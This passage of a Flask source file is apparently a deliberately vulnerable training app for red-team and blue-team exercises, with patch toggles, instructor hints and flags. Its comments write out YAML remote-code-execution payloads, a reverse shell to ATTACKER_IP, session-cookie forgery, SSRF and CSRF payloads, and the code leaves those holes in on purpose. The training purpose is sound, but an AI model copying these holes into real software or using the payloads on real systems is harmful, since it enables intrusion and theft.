            "num": 10, "title": "Debug Endpoint → Session Forgery", "type": "Secret Key Leak → Cookie Forgery",
            "level": "Advanced", "endpoint": "GET /debug → forge session → GET /admin",
            "hint": "The /debug route leaks the Flask secret_key. Use flask-unsign to forge an admin session cookie.",
            "payload": "1. curl http://TARGET/debug\n2. flask-unsign --sign --cookie '{\"role\":\"admin\",\"user\":{\"id\":1,\"name\":\"admin\",\"emp_id\":\"SYSADMIN\"}}' --secret 'vidyatech@2024secret'",
            "tool": "curl + flask-unsign",
            "flag": "VT{d3bug_s3cr3t_k3y_forg3d}"
        },
        {
            "num": 13, "title": "URL Fetcher SSRF", "type": "SSRF → Internal Network Pivot",
            "level": "Advanced", "endpoint": "POST /tools/fetch-url",
            "hint": "The URL health checker fetches any URL with no IP validation. Point it at internal endpoints.",
            "payload": "url=http://127.0.0.1:5000/api/internal/config\nurl=http://127.0.0.1:5000/debug",
            "tool": "Browser or Burp Suite",
            "flag": "VT{ssrf_1ntern4l_p1v0t}"
        },
        {
            "num": 14, "title": "Clickjacking", "type": "Missing X-Frame-Options",
            "level": "Easy", "endpoint": "Any page (e.g. /login)",
            "hint": "The site does not set X-Frame-Options or Content-Security-Policy frame-ancestors. Any page can be embedded in an iframe on an attacker's site.",
            "payload": '<iframe src="http://localhost:5000/login" width="800" height="600"></iframe>',
            "tool": "Browser",
            "flag": "VT{cl1ckj4ck1ng_n0_xfr4me}"
        },
        {
            "num": 15, "title": "Weak Password Policy", "type": "Weak Credentials",
            "level": "Easy", "endpoint": "POST /account/change-password",
            "hint": "The password change form accepts any password including single characters. No strength validation.",
            "payload": "new_password=1  (or any 1-char value)",
            "tool": "Browser",
            "flag": "VT{w34k_p4ssw0rd_p0l1cy}"
        },
        {
            "num": 16, "title": "CSRF — Email Hijack", "type": "Cross-Site Request Forgery",
            "level": "Easy", "endpoint": "POST /account/update-email",
            "hint": "The email update form has no CSRF token. An attacker can host an auto-submitting form that changes the victim's email.",
            "payload": '<html><body onload="document.forms[0].submit()"><form action="http://localhost:5000/account/update-email" method="POST"><input name="email" value="attacker@evil.com"></form></body></html>',
            "tool": "Browser",
            "flag": "VT{csrf_3mail_hij4ck}"
        }
    ]
    return render_template("instructor_hints.html", hints=hints)

# ══════════════════════════════════════════════════════════════════════════════
# VULN 9 — A06: PyYAML unsafe_load → Remote Code Execution
# ──────────────────────────────────────────────────────────────────────────────
# RED TEAM ATTACK:
#   Tool 1 — python3: craft YAML payload
#     !!python/object/apply:subprocess.check_output
#     - [id]
#   Tool 2 — curl or browser: POST payload to /tools/yaml-import
#     curl -X POST http://localhost:5000/tools/yaml-import \
#       -d 'yaml_input=!!python/object/apply:subprocess.check_output%0A- [id]'
#   Reverse shell (nc -lvnp 4444 on attacker first):
#     !!python/object/apply:os.system
#     - 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
#
# BLUE TEAM PATCH:
#   Toggle yaml_rce in ADVANCED_PATCHES to True (via /blueteam/advanced-patch)
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/tools/yaml-import", methods=["GET", "POST"])
def yaml_import():
    """Staff YAML bulk-import tool — VULNERABILITY: yaml.unsafe_load() allows RCE"""
    if not session.get("user"):
        return redirect(url_for("staff_login"))
    result = None
    error  = None
    output = None
    if request.method == "POST":
        yaml_data = request.form.get("yaml_input", "")
        try:
            try:
                import yaml
            except ImportError:
                error = "PyYAML not installed on this server. Run: pip install pyyaml"
                return render_template("yaml_import.html", result=None, error=error, output=None,
                                       user=session.get("user"), role=session.get("role"))
            if ADVANCED_PATCHES["yaml_rce"]:
                parsed = yaml.safe_load(yaml_data)   # PATCHED
            else:
                parsed = yaml.unsafe_load(yaml_data)  # VULNERABLE
            if isinstance(parsed, bytes):
                output = parsed.decode("utf-8", errors="replace")
            elif isinstance(parsed, str):
                output = parsed
            else:
                result = str(parsed)
        except Exception as e:
            error = str(e)
    return render_template("yaml_import.html", result=result, error=error, output=output,
                           user=session.get("user"), role=session.get("role"))


# ══════════════════════════════════════════════════════════════════════════════
# VULN 10 — A07: /debug leaks secret_key → Session Cookie Forgery → Admin Access
# ──────────────────────────────────────────────────────────────────────────────
# RED TEAM ATTACK:
#   Tool 1 — curl: curl http://localhost:5000/debug  (copy the secret_key value)
#   Tool 2 — flask-unsign:
#     pip install flask-unsign
#     flask-unsign --sign \
#       --cookie '{"role":"admin","user":{"id":1,"name":"admin","emp_id":"SYSADMIN"}}' \
#       --secret 'vidyatech@2024secret'
#     Set browser cookie: session = <forged_value>
#     Visit /admin → full admin dashboard
#
# BLUE TEAM PATCH:
#   Toggle block_debug in ADVANCED_PATCHES to True (via /blueteam/advanced-patch)
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/debug")
def debug():
    """VULNERABILITY: exposes Flask secret_key and internal config"""
    if ADVANCED_PATCHES["block_debug"]:
        return jsonify({"error": "Debug endpoint has been disabled by the security team."}), 403
    return jsonify({
        "status":     "DEBUG MODE ENABLED",
        "warning":    "Remove this endpoint before production",
        "secret_key": app.secret_key,
        "db_path":    "data/vidyatech.db",
        "version":    "VidyaTech Portal v3.1.2",
        "routes":     [str(r) for r in app.url_map.iter_rules()],
        "config": {
            "aws_key":      "AKIAIOSFODNN7VIDYATECH",
            "aws_secret":   "wJalrXUtnFEMI/K7MDENG/bPxRfiCYVIDYATECH",
            "smtp_pass":    "VidyaTech_smtp@2024",
            "admin_token":  "Bearer vt-internal-7f3a2b9c4d5e6f",
            "internal_api": "http://127.0.0.1:5000/api/internal"
        }
    })


# ══════════════════════════════════════════════════════════════════════════════
# VULN 13 — A10: SSRF → Internal Network Access
# ──────────────────────────────────────────────────────────────────────────────
# RED TEAM ATTACK:
#   Tool 1 — Burp Suite: intercept POST to /tools/fetch-url, modify url= param
#     url=http://127.0.0.1:5000/debug               → dump config + secret_key
#     url=http://127.0.0.1:5000/api/internal/config → full internal config dump
#     url=http://169.254.169.254/latest/meta-data/  → AWS cloud metadata
#   Tool 2 — curl:
#     curl -X POST http://localhost:5000/tools/fetch-url \
#       -d 'url=http://127.0.0.1:5000/api/internal/config'
#
# BLUE TEAM PATCH:
#   Toggle ssrf_block in ADVANCED_PATCHES to True (via /blueteam/advanced-patch)
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/tools/fetch-url", methods=["GET", "POST"])
def fetch_url():
    """URL Health Checker — VULNERABILITY: no IP validation allows SSRF"""
    result      = None
    error       = None
    status_code = None
    if request.method == "POST":
        url = request.form.get("url", "").strip()
        if url:
            try:
                if ADVANCED_PATCHES["ssrf_block"]:
                    import ipaddress, socket
                    from urllib.parse import urlparse as _urlparse
                    _p = _urlparse(url)
                    _PRIVATE = [
                        ipaddress.ip_network("127.0.0.0/8"),
                        ipaddress.ip_network("10.0.0.0/8"),
                        ipaddress.ip_network("172.16.0.0/12"),
                        ipaddress.ip_network("192.168.0.0/16"),
                        ipaddress.ip_network("169.254.0.0/16"),
                        ipaddress.ip_network("::1/128"),
                    ]
                    try:
                        _resolved = ipaddress.ip_address(socket.gethostbyname(_p.hostname or ""))
                        if any(_resolved in net for net in _PRIVATE):
                            return render_template("fetch_url.html",
                                result=None, status_code=None,
                                error="Blocked: access to internal/private IP addresses is not allowed.",
                                user=session.get("user"), role=session.get("role"))
                    except Exception:
                        pass
                req  = urllib.request.Request(
                    url, headers={"User-Agent": "VidyaTechHealthChecker/1.0"}
                )
                resp = urllib.request.urlopen(req, timeout=6)
                status_code = resp.getcode()
                result = resp.read().decode("utf-8", errors="replace")[:5000]
            except urllib.error.HTTPError as e:
                status_code = e.code
                try:
                    error = e.read().decode("utf-8", errors="replace")[:2000]
                except Exception:
                    error = str(e)
            except Exception as e:
                error = str(e)
    return render_template("fetch_url.html", result=result, error=error, status_code=status_code,
                           user=session.get("user"), role=session.get("role"))


# ─────────────────────────── INTERNAL API (SSRF target) ──────────────────────

@app.route("/api/internal/config")
def internal_config():
    """Reachable only via SSRF — blocked from external IPs."""
    if request.remote_addr not in ("127.0.0.1", "::1"):
        return jsonify({"error": "Internal endpoint — not accessible externally"}), 403
    try:
        with open("data/config.json") as f:
            config = json.load(f)
    except Exception:
        config = {}
    return jsonify({"status": "INTERNAL CONFIG — ACCESSED VIA SSRF", "config": config})


# ─────────────────────────── ADVANCED PATCH PANEL ────────────────────────────

@app.route("/blueteam/advanced-patch", methods=["GET", "POST"])
def advanced_patch_panel():
    """Blue Team live patch panel for the 3 advanced vulnerabilities."""
    PANEL_PIN = "VT@ADVANCED2024"
    if not session.get("advanced_patch_auth"):
        if request.method == "POST" and request.form.get("pin") == PANEL_PIN:
            session["advanced_patch_auth"] = True
            return redirect(url_for("advanced_patch_panel"))
        error = "Wrong PIN." if request.method == "POST" else None
        return f"""<!DOCTYPE html><html><head><title>Advanced Patch Panel</title>
<style>body{{background:#060d18;color:#e2e8f0;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}}
.box{{background:#0a1628;border:1px solid #1a2535;border-radius:12px;padding:2rem;width:320px;text-align:center}}
h2{{color:#00d4ff;margin-bottom:1rem}}input{{width:100%;padding:10px;background:#060d18;border:1px solid #1a2535;color:#e2e8f0;border-radius:6px;margin-bottom:1rem;box-sizing:border-box}}
button{{width:100%;padding:10px;background:#00d4ff;color:#060d18;border:none;border-radius:6px;font-weight:700;cursor:pointer}}
.err{{color:#ff4757;margin-bottom:1rem}}</style></head><body>
<div class="box"><h2>🔵 Advanced Patch Panel</h2>
{'<div class="err">'+error+'</div>' if error else ''}
<form method="POST"><input type="password" name="pin" placeholder="Enter PIN"><button>Unlock</button></form></div></body></html>"""

    msg = None
    if request.method == "POST" and request.form.get("action") == "toggle":
        key = request.form.get("key")
        if key in ADVANCED_PATCHES:
            ADVANCED_PATCHES[key] = not ADVANCED_PATCHES[key]
            state = "PATCHED ✅" if ADVANCED_PATCHES[key] else "VULNERABLE 🔴"
            msg = f"{key} is now {state}"
            try:
                with open(LOG_PATH, "a", encoding="utf-8") as f:
                    f.write(
                        f"{datetime.datetime.now().strftime('%H:%M:%S')} "
                        f"[BLUE_TEAM] ADVANCED_PATCH key={key} state={ADVANCED_PATCHES[key]} "
                        f"ip={request.remote_addr}\n"
                    )
            except Exception:
                pass

    labels = {
        "yaml_rce":    ("YAML RCE", "POST /tools/yaml-import", "Advanced"),
        "block_debug": ("Debug → Session Forgery", "GET /debug", "Advanced"),
        "ssrf_block":  ("SSRF → Internal Pivot", "POST /tools/fetch-url", "Advanced"),
    }
    rows = ""
    for key, (name, endpoint, level) in labels.items():
        patched = ADVANCED_PATCHES[key]
        status_style = "color:#00ff88" if patched else "color:#ff4757"
        status_text  = "PATCHED ✅" if patched else "VULNERABLE 🔴"
        rows += f"""<tr>
<td style="padding:12px;color:#e2e8f0;font-weight:600">{name}</td>
<td style="padding:12px;color:#64748b;font-family:monospace;font-size:12px">{endpoint}</td>
<td style="padding:12px;color:#ffa502">{level}</td>
<td style="padding:12px;{status_style};font-weight:700">{status_text}</td>
<td style="padding:12px"><form method="POST" style="margin:0">
<input type="hidden" name="action" value="toggle">
<input type="hidden" name="key" value="{key}">
<button style="padding:6px 14px;background:{'#1a3a1a' if patched else '#3a1a1a'};color:{'#00ff88' if patched else '#ff4757'};border:1px solid {'#00ff88' if patched else '#ff4757'};border-radius:4px;cursor:pointer;font-family:monospace">
{'Revert' if patched else 'Apply Patch'}</button></form></td></tr>"""

    return f"""<!DOCTYPE html><html><head><title>Advanced Patch Panel</title>
<style>body{{background:#060d18;color:#e2e8f0;font-family:monospace;padding:2rem;margin:0}}
h1{{color:#00d4ff}}table{{width:100%;border-collapse:collapse;background:#0a1628;border-radius:8px;overflow:hidden}}
th{{background:#0f1f35;padding:12px;text-align:left;color:#64748b;font-size:12px;text-transform:uppercase;letter-spacing:1px}}
tr:hover{{background:#0d1a2e}}.msg{{background:#0a2a1a;border:1px solid #00ff88;color:#00ff88;padding:10px 16px;border-radius:6px;margin-bottom:1rem}}</style></head>
<body><h1>🔵 Advanced Vulnerability Patch Panel</h1>
{'<div class="msg">'+msg+'</div>' if msg else ''}
<table><thead><tr><th>Vulnerability</th><th>Endpoint</th><th>Level</th><th>Status</th><th>Action</th></tr></thead>
<tbody>{rows}</tbody></table>
<p style="color:#475569;margin-top:1rem;font-size:12px">PIN: VT@ADVANCED2024 | <a href="/" style="color:#00d4ff">← Home</a></p>
</body></html>"""


if __name__ == "__main__":
    init_db()
    port = int(os.environ.get("FLASK_RUN_PORT", 5000))
    app.run(debug=True, host="0.0.0.0", port=port)


# ══════════════════════════════════════════════════════════════════════════════
# VULN 14 — Clickjacking: Missing X-Frame-Options
# ──────────────────────────────────────────────────────────────────────────────
# The app never sets X-Frame-Options or CSP frame-ancestors.
# Any page can be embedded in an attacker's iframe.
# BLUE TEAM PATCH: Toggle clickjacking_fix via /api/patch
# ══════════════════════════════════════════════════════════════════════════════

# NOTE: Clickjacking is demonstrated by the absence of X-Frame-Options header.
# The @app.after_request hook below adds it only when patched.
# The vulnerability exists on ALL pages by default — no special route needed.

@app.after_request
def add_security_headers(response):
    """Add X-Frame-Options only when clickjacking patch is active."""
    if is_patched("clickjacking_fix"):
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["Content-Security-Policy"] = "frame-ancestors 'none'"
    # VULNERABILITY: without patch, no X-Frame-Options header is set
    return response


# ══════════════════════════════════════════════════════════════════════════════
# VULN 15 — Weak Password Policy
# ──────────────────────────────────────────────────────────────────────────────
# Password change accepts any value — no minimum length, no complexity check.
# RED TEAM: change password to "1" or any trivial value
# BLUE TEAM PATCH: Toggle weak_password via /api/patch
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/account/change-password", methods=["GET", "POST"])
def change_password():
    """VULNERABILITY: no password strength validation"""
    if not session.get("user") or session.get("role") != "student":
        return redirect(url_for("login"))
    msg = None
    ok = False
    if request.method == "POST":
        new_pwd = request.form.get("new_password", "")
        confirm = request.form.get("confirm_password", "")
        if new_pwd != confirm:
            msg = "Passwords do not match."
        elif is_patched("weak_password") and len(new_pwd) < 8:
            msg = "Password must be at least 8 characters."
        elif not new_pwd:
            msg = "Password cannot be empty."
        else:
            db = get_db()
            _exec(db, "UPDATE students SET password=? WHERE id=?",
                       (new_pwd, session["user"]["id"]))
            db.commit()
            db.close()
            session["user"]["password"] = new_pwd
            msg = "Password updated successfully."
            ok = True
    return render_template("change_password.html", msg=msg, ok=ok,
                           user=session.get("user"), role=session.get("role"))


# ══════════════════════════════════════════════════════════════════════════════
# VULN 16 — CSRF: Email Update with No Token
# ──────────────────────────────────────────────────────────────────────────────
# The email update form has no CSRF token. An attacker can host a page that
# auto-submits a form to change the victim's email while they are logged in.
# RED TEAM: host HTML with auto-submit form pointing to this endpoint
# BLUE TEAM PATCH: Toggle csrf_email via /api/patch
# ══════════════════════════════════════════════════════════════════════════════

import secrets as _secrets
_CSRF_TOKENS = {}  # session_id -> token (only used when patched)

@app.route("/account/update-email", methods=["GET", "POST"])
def update_email():
    """VULNERABILITY: no CSRF token on email update form"""
    if not session.get("user") or session.get("role") != "student":
        return redirect(url_for("login"))
    msg = None
    ok = False
    csrf_token = None

    if is_patched("csrf_email"):
        # PATCHED: generate and validate CSRF token
        sid = session.get("user", {}).get("id", "anon")
        if request.method == "GET":
            csrf_token = _secrets.token_hex(16)
            _CSRF_TOKENS[sid] = csrf_token
        elif request.method == "POST":
            submitted = request.form.get("csrf_token", "")
            expected  = _CSRF_TOKENS.get(sid, "")
            if not submitted or submitted != expected:
                msg = "Invalid CSRF token. Request blocked."
                return render_template("update_email.html", msg=msg, ok=False,
                                       csrf_token=None, user=session.get("user"),
                                       role=session.get("role"))
    
    if request.method == "POST":
        new_email = request.form.get("email", "").strip()
        if not new_email or "@" not in new_email:
            msg = "Please enter a valid email address."
        else:
            db = get_db()
            _exec(db, "UPDATE students SET email=? WHERE id=?",
                       (new_email, session["user"]["id"]))
            db.commit()
            db.close()
            session["user"]["email"] = new_email
            msg = f"Email updated to {new_email}."
            ok = True

    return render_template("update_email.html", msg=msg, ok=ok,
                           csrf_token=csrf_token,
                           user=session.get("user"), role=session.get("role"))
